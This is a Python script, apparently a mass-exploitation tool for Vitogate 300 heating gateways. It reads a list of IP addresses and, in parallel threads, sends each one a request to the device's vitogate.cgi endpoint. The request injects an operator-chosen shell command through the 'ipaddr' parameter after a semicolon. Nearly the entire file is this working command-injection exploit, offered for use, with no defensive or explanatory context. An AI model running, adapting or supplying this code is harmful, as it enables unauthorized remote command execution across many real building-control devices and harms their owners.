# Made By NRPE | Vitogate 300 #

import concurrent.futures
import os
import requests
from functools import partial
import logging
import re
from requests.auth import HTTPBasicAuth

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def sanitize_command(command):
    return re.sub(r'[^a-zA-Z0-9_\-;]', '', command)

def send_da_hacks(ip, port, command):
    url = f"http://{ip}:{port}/cgi-bin/vitogate.cgi"
    payload = {
        "method": "put",
        "form": "form-4-8",
        "session": "",
        "params": {
            "ipaddr": f"1;{command}"
        }
    }
    headers = {
        "Host": ip,
        "Content-Type": "application/json"
    }

    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

    try:
        response = requests.post(url, json=payload, headers=headers, verify=False, timeout=3)
        if response.status_code == 200:
            logging.info(f"Request Sent To {ip}:{port}")
        else:
            logging.warning(f"Request To {ip}:{port} Failed with status code: {response.status_code}")
    except requests.RequestException as e:
        logging.error(f"Error sending request to {ip}:{port}: {e}")

def main(ip_list, port, command):
    if not os.path.exists(ip_list):
        logging.error(f"File {ip_list} not found!")
        return
    
    with open(ip_list, 'r') as file:
        ips = [line.strip() for line in file if line.strip()]

    if not ips:
        logging.warning("IP list is empty.")
        return

    sanitized_command = sanitize_command(command)

    success_count = 0
    failure_count = 0

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor: # change max workers if needed
        futures = {executor.submit(partial(send_da_hacks, port=port, command=sanitized_command), ip): ip for ip in ips}

        for future in concurrent.futures.as_completed(futures):
            ip = futures[future]
            try:
                future.result()
                success_count += 1
            except Exception:
                failure_count += 1

    logging.info(f"Finished processing IPs: {success_count} succeeded, {failure_count} failed.")

if __name__ == "__main__":
    ip_list = "list.txt"
    port = 80
    command = "add your command"
    main(ip_list, port, command)
